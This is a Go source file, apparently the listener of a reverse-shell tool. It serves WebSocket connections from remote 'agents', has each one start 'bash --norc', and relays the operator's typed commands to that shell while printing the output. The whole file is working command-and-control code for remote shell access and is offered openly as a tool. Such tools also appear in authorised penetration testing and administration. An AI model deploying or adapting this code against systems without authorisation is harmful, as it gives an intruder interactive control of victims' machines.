package main

import (
	"fmt"
	"io"
	"net/http"
	"os"

	"github.com/golang/glog"
	"github.com/gorilla/websocket"
	"github.com/maxlaverse/reverse-shell/message"
	"github.com/maxlaverse/reverse-shell/util"
)

type onConnectMaster struct {
	stdinChannel  chan []byte
	stdoutChannel chan []byte
}

func (h onConnectMaster) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	conn, err := util.WebSocketUpgrader.Upgrade(w, r, nil)
	if err != nil {
		glog.Errorf("Error while upgrading: %s", err)
		return
	}

	done := make(chan bool)
	ready := make(chan string)

	go func() {
		defer conn.Close()
		for {
			_, m, err := conn.ReadMessage()
			if err != nil {
				glog.V(2).Infof("ReadMessage error: %s", err)
				return
			}
			b := message.FromBinary(m)
			switch v := b.(type) {
			case *message.ProcessOutput:
				os.Stdout.Write(v.Data)
			case *message.ProcessCreated:
				h.stdoutChannel <- []byte(fmt.Sprintf("New session is named: %s\n", v.Id))
				ready <- v.Id
			case *message.ProcessTerminated:
				h.stdoutChannel <- []byte(fmt.Sprintf("Session closed: %s\n", v.Id))
				done <- true
				//Stdin should write in neutral channel
				return
			case *message.SessionTable:
				if len(v.Sessions) == 0 {
					h.stdoutChannel <- []byte("No session yet for incoming connection starting a new session")
					m := message.CreateProcess{
						CommandLine: "bash --norc",
					}
					conn.WriteMessage(websocket.BinaryMessage, message.ToBinary(m))
				} else {
					h.stdoutChannel <- []byte(fmt.Sprintf("Recovering session named: %s\n", v.Sessions[0]))
					ready <- v.Sessions[0]
				}
			default:
				glog.V(2).Infof("Received an unknown message type: %v", v)
			}
		}
	}()

	go func() {
		var re string
		for {
			select {
			case le := <-ready:
				glog.V(2).Infof("We are ready now %s", le)
				re = le
			case <-done:
				glog.V(2).Infof("Exiting stdin to conn relay")
				return
			case msg := <-h.stdinChannel:
				if len(msg) == 0 {
					close(h.stdoutChannel)
					return
				}
				if re == "" {
					h.stdoutChannel <- []byte("No session available yet")
					continue
				}
				h.stdoutChannel <- []byte("Session available and used")
				m := message.ExecuteCommand{
					Id:      re,
					Command: msg,
				}
				conn.WriteMessage(websocket.BinaryMessage, message.ToBinary(m))
			}
		}
	}()
}

func Listen(port int) error {
	glog.V(2).Infof("Listening to incoming connections from Agents")

	stdinChannel := make(chan []byte)
	go func() {
		for {
			select {
			default:
				var msg = make([]byte, 1024)
				size, err := os.Stdin.Read(msg)
				if err == io.EOF {
					return
				} else if err != nil {
					panic(err)
				} else {
					glog.V(2).Infof("Sending to stdint")
					stdinChannel <- msg[0:size]
				}
			}
		}
	}()

	stdoutChannel := make(chan []byte)
	go func() {
		for {
			select {
			case n := <-stdoutChannel:
				os.Stdout.Write(n)
				os.Stdout.WriteString("\n")
			}
		}
	}()

	go http.Handle("/agent/", onConnectMaster{stdinChannel: stdinChannel, stdoutChannel: stdoutChannel})
	return http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
}
